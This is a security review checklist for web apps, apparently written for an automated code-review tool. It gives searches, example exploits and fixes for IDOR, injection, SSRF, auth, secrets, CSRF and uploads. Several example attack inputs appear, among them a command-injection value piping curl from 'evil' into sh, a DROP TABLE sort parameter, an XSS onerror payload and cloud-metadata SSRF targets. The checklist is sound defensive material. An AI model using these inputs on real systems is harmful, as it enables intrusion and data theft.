# app-security-review checklist

Work through every area, then read the framework notes for the stacks the repo uses. Each item
gives: what to check, the evidence (a repo pattern or a read-only search), the exploit to look
for, and the typical fix.

Every search below is one command that passes the read-only guard. Replace UPPERCASE
placeholders (`APP_DIR`, `MODEL`) with the repo's own paths and names. Exclude vendored code
(`node_modules`, `vendor`, `.venv`, `dist`, `build`) from conclusions; a hit there is a
dependency question, not app code.

The finding bar (SKILL.md section 4): no concrete exploit, no finding. It goes under "Worth
hardening" instead. Framework defaults are not findings unless the code disables them.

Never print secret values (contract section 6): use `grep -l` or `grep -c` for secret
patterns, and never open `.env*` files other than `.env.example`, `.env.sample` and `.env.dist`.

## 1. Authorization and IDOR

- **Every mutating route checks ownership, not just login.** Evidence: list the routes (route
  files, `urls.py`, `config/routes.rb`, `app/api/**/route.ts`), then open each update, delete,
  export and admin handler. Look for a lookup by raw ID (`find(id)`, `findById`,
  `objects.get(pk=...)`, `Model.find(params[:id])`) with no owner scope or policy call after
  it. Exploit: user B sends user A's ID in the URL or body and reads, edits or deletes A's
  record. Fix: scope the query to the actor (`user.records().find(id)`), or call the policy
  before acting; return 404 for records the actor does not own.
- **Reads leak too.** Evidence: show, download, export and JSON endpoints, signed or
  "unguessable" URLs, sequential IDs in public links. Exploit: enumerate IDs to read other
  users' invoices or files. Fix: owner scope on reads; random IDs are not access control.
- **Role checks are on the server.** Evidence: admin pages hidden only in the frontend
  (`isAdmin &&` in JSX, a hidden menu), middleware that checks a role on some admin routes but
  not their API twins. Exploit: a normal user calls the admin API directly. Fix: one role
  middleware or policy on the whole admin route group.
- **Nested and batch routes check every ID.** Evidence: `/teams/:team/projects/:project`
  checking the team but not that the project belongs to it; bulk actions taking an `ids[]`
  array. Exploit: a valid team ID plus a foreign project ID. Fix: scope the child through the
  parent and filter bulk IDs by owner.

## 2. Mass assignment

- **Models have an allow-list and handlers pass validated fields only.** Evidence:
  `grep -rnE 'create[(]|update[(]|fill[(]' APP_DIR` next to whole-request input
  (`request.all()`, `req.body`, `request.POST`, `params.permit!`), models with
  `guarded = []` or no `fillable`, serializers with `fields = '__all__'`. Exploit: add
  `role=admin`, `is_admin=1`, `user_id=OTHER` or `email_verified_at` to a profile update.
  Fix: validate and pass named fields only; keep sensitive columns out of the allow-list.

## 3. Injection

- **SQL is parameterized.** Evidence: `grep -rnE 'raw[(]|whereRaw|selectRaw|orderByRaw|execute[(]|query[(]|extra[(]|find_by_sql|sanitize_sql' APP_DIR`,
  then check whether request input is concatenated or interpolated into the string (string
  templates, `+`, f-strings, `#{}`). Sort and column names from the request are a classic
  hole. Exploit: `?sort=id;DROP TABLE` or a `UNION SELECT` in a search box. Fix: bindings for
  values, an allow-list for column and direction names.
- **Raw HTML sinks get trusted HTML only.** Evidence:
  `grep -rnE 'dangerouslySetInnerHTML|v-html|innerHTML|html_safe|raw[(]|[|]safe|mark_safe|autoescape off' .`
  and Blade's unescaped echo (grep `'[{]!!'`). Trace each sink back: author-only content
  (repo Markdown, admin CMS behind auth) is fine; comments, profiles, form input, query
  strings or imported data is stored or reflected XSS. Exploit: a comment with
  `<img src=x onerror=...>` runs in an admin's session. Fix: escape, or sanitize with an
  allow-list sanitizer (DOMPurify, HTMLPurifier, bleach, `sanitize`) at render time.
- **No user input reaches a shell, eval or template compiler.** Evidence:
  `grep -rnE 'exec[(]|spawn[(]|system[(]|shell_exec|passthru|popen|subprocess|child_process|eval[(]|new Function|render_template_string|Template[(]' APP_DIR`.
  Exploit: a filename or option like `x; curl evil | sh`. Fix: argument arrays without a
  shell, an allow-list of values, never compile templates from user strings.
- **Deserialization of untrusted data.** Evidence: `unserialize`, `pickle.loads`,
  `yaml.load` without a safe loader, `Marshal.load`, on request or cookie data. Exploit:
  gadget chain to code execution. Fix: JSON, or the safe loader.

## 4. Open redirects and SSRF

- **Redirect targets are checked.** Evidence: redirects built from `next`, `return`,
  `redirect`, `url` or `to` parameters, short-link or "go" routes. Exploit:
  `/login?next=https://evil.example` after a real login, for phishing. Fix: allow relative
  paths only (and reject `//host`), or an allow-list of hosts.
- **Server-side fetches of user URLs are fenced.** Evidence: webhooks, URL previews, image
  or PDF fetch, import-from-URL, OAuth or OIDC discovery using a user value
  (`grep -rnE 'fetch[(]|axios|got[(]|requests[.](get|post)|Http::|file_get_contents|open-uri|Net::HTTP|curl_exec' APP_DIR`).
  Exploit: `http://169.254.169.254/` (cloud metadata), `http://localhost:6379`, or a
  redirect that lands there. Fix: allow-list hosts or resolve and block private, loopback
  and link-local ranges on every redirect hop; no `file://` or `gopher://`.

## 5. Auth flows

- **Reset and verification tokens are single-use, expiring and compared safely.** Evidence:
  reset and magic-link handlers, token tables, `==` on tokens. Exploit: reuse an old reset
  link, or a token that never expires from a leaked email. Fix: hashed, single-use tokens
  with a short TTL, constant-time compare, invalidate on password or email change.
- **Session is regenerated on login and privilege change.** Evidence: login, social login
  and impersonation handlers. Exploit: session fixation, where an attacker plants a session
  ID before the victim signs in. Fix: regenerate the session ID on login and logout.
- **Login, reset, signup, OTP and contact routes are rate limited.** Evidence: throttle
  middleware or limiter config on those routes. Exploit: brute force a 6-digit code, or
  spam reset emails. Fix: per-account and per-IP limits.
- **Account linking and OAuth are tied to verified email.** Evidence: social login that
  matches an existing account by email from a provider that does not verify it; OAuth
  `state` not checked. Exploit: sign in as the victim with an unverified provider email.
  Fix: link only on verified email, check `state` and PKCE.
- **Email change and account deletion re-confirm.** Exploit: a stolen session changes the
  email, then resets the password. Fix: confirm on the old address or ask for a fresh login.

## 6. Secrets and production config

- **No secrets in tracked files.** Evidence: `git ls-files | grep -iE '[.]env|[.]pem|id_rsa|credentials|[.]p12'`
  (expect only examples), and
  `grep -rlE '(api[_-]?key|secret|password|token)[^,]{0,8}[=:] *[A-Za-z0-9/+_-]{16,}' --exclude-dir=node_modules --exclude-dir=vendor .`
  (file names only). Also look for known prefixes (`sk_live_`, `AKIA`, `ghp_`, `xox`) with
  `grep -rlE`. Exploit: anyone with repo access, or a leaked clone, gets the key. Fix: rotate
  the key first, then move it to the secret store; history still holds the old value.
- **Config fails closed.** Evidence: config that falls back to a default secret
  (`env('APP_KEY', 'something')`, `process.env.JWT_SECRET || 'dev'`, `SECRET_KEY = '...'`
  in settings). Exploit: forge sessions or JWTs with the default. Fix: no default; crash at
  boot when it is missing.
- **Debug is off in production.** Evidence: `APP_DEBUG=true`, `DEBUG = True`,
  `consider_all_requests_local = true`, debug toolbars or error pages enabled by default in
  production config, source maps published. Exploit: a forced error shows stack traces, env
  vars and paths. Fix: debug from env, off by default.

## 7. CSRF

- **No state-changing route is exempt without another check.** Evidence: CSRF exclusion lists
  (`except` arrays, `csrf_exempt`, `skip_forgery_protection`, `protect_from_forgery` turned
  off, a custom API with cookie auth and no token). Webhooks are a fair exemption only when
  they verify a signature (Stripe, GitHub, etc.) before acting. Exploit: a page on another
  site posts a form to the exempt route with the victim's cookies. Fix: restore the token, or
  verify the webhook signature with a constant-time compare.
- **GET does not change state.** Exploit: `<img src=/account/delete>`. Fix: POST or DELETE.

## 8. Cookies and sessions

- **Session cookies are `Secure`, `HttpOnly` and `SameSite=Lax` or stricter.** Evidence:
  session config, `cookie(` calls, JWTs stored in `localStorage`. Exploit: an XSS reads the
  token, or the cookie travels over plain HTTP. Fix: set the flags; keep tokens in HttpOnly
  cookies.
- **Sessions end.** Evidence: idle and absolute lifetimes, logout that clears the server
  session, sessions invalidated on password change. Fix: finite lifetime and server-side
  revocation.
- **CORS is not a wildcard with credentials.** Evidence: `Access-Control-Allow-Origin`
  reflecting the request origin while allowing credentials. Exploit: another site reads
  signed-in API responses. Fix: an explicit origin list.

## 9. File uploads and user content

- **Uploads are checked and stored safely.** Evidence: upload handlers, storage paths,
  validation rules. Exploit: upload `shell.php` or an SVG with script into a public,
  executable or same-origin folder; path traversal in the filename (`../../`). Fix: validate
  type by content, size limits, random server-side names, store outside the web root or on
  another domain, serve with `Content-Disposition: attachment` for unknown types.
- **Archives and images are bounded.** Exploit: zip bombs, zip slip, huge image dimensions.
  Fix: size and entry limits, extract into a fixed folder.
- **User content is escaped and rate limited.** Evidence: comments, profiles, reviews,
  contact forms. Exploit: stored XSS (area 3) or a spam flood. Fix: escaping, a captcha or
  rate limit on anonymous forms.

## 10. Email header injection

- **User values go into the body, not headers.** Evidence: mail code that puts a form's name,
  email or subject into `From`, `Reply-To`, `Subject`, `To` or `Cc`, or builds raw headers.
  Exploit: a name containing a newline adds `Bcc:` and turns the form into a spam relay. Fix:
  the mail library's address objects, strip CR and LF, a fixed `From`, the visitor's address
  only in `Reply-To` after validation.

## 11. Dependency CVEs

- **Audit each ecosystem that has a lockfile**, with live consent, in the exact forms from
  SKILL.md section 2. No lockfile or tool missing: skip and note it.
- **Rank only what the app reaches.** For each advisory, find the package in the lockfile,
  check it is a runtime dependency (not dev-only), then grep the app for the vulnerable
  function or feature. Reached: a finding with the upgrade as the fix. Not reached: "Worth
  hardening" with the upgrade.
- **Check what the audit tools miss.** Evidence: unpinned versions in manifests, packages
  from Git URLs, abandoned packages, frontend libraries copied into `public/`. Fix: pin and
  update.

## Framework notes

### Laravel

- Routes: `routes/web.php`, `routes/api.php`; ownership in Policies (`app/Policies`),
  `authorize()` and `can` middleware. Admin areas often check a role middleware only.
- Mass assignment: `$fillable` and `$guarded` in `app/Models`; look for
  `$request->all()` passed to `create` or `update`.
- SQL: `DB::raw`, `whereRaw`, `orderByRaw`, `selectRaw`. XSS: Blade's unescaped echo, and
  `dangerouslySetInnerHTML` or `v-html` in Inertia pages.
- CSRF: `VerifyCsrfToken` `$except`, or `validateCsrfTokens(except:)` in `bootstrap/app.php`.
- Config: `config/app.php` debug, `config/session.php` (`secure`, `http_only`, `same_site`),
  `config/sanctum.php` stateful domains, `config/cors.php`.
- Throttle: `throttle:` middleware and `RateLimiter::for` in a service provider.

### Node / Express / Next.js

- Routes: Express routers, `app/api/**/route.ts`, `pages/api/`, server actions
  (`'use server'`), `middleware.ts`. Server actions are public POST endpoints: each needs its
  own auth and ownership check.
- Mass assignment: `req.body` spread into ORM `create` or `update` (Prisma, Sequelize,
  Mongoose, TypeORM, Drizzle).
- SQL: `$queryRawUnsafe`, `sequelize.query` with template strings, `knex.raw`. NoSQL
  injection: objects like `{"$ne": null}` from `req.body` in Mongo queries.
- XSS: `dangerouslySetInnerHTML`, Markdown rendered without a sanitizer.
- Config: `helmet`, `cors` options, `express-session` or cookie flags, `NEXT_PUBLIC_*`
  variables (shipped to the browser, never secrets).
- Prototype pollution: deep merge of request JSON into objects.

### Django

- Routes: `urls.py`; views with `login_required` but no owner filter on
  `get_object_or_404(Model, pk=pk)`. DRF: `get_queryset` not scoped to `request.user`,
  missing `permission_classes`.
- Mass assignment: `ModelForm` or serializers with `fields = '__all__'` or no
  `read_only_fields`.
- SQL: `raw()`, `extra()`, `cursor.execute` with f-strings. XSS: `mark_safe`, `|safe`,
  `{% autoescape off %}`.
- CSRF: `csrf_exempt`. Config: `DEBUG`, `ALLOWED_HOSTS`, `SECRET_KEY` default,
  `SESSION_COOKIE_SECURE`, `CSRF_COOKIE_SECURE`.

### Rails

- Routes: `config/routes.rb`; controllers using `Model.find(params[:id])` instead of
  `current_user.models.find`. Check Pundit or CanCanCan policies and `skip_before_action`
  on auth filters.
- Mass assignment: `params.permit!` or broad `permit` lists including `role` or `admin`.
- SQL: string interpolation in `where`, `order`, `find_by_sql`. XSS: `html_safe`, `raw`.
- CSRF: `skip_forgery_protection`, `protect_from_forgery` options.
- Config: `config/environments/production.rb` (`consider_all_requests_local`,
  `force_ssl`), `secret_key_base`, committed `config/master.key`.
- Redirects: `redirect_to params[...]` without `allow_other_host: false`.
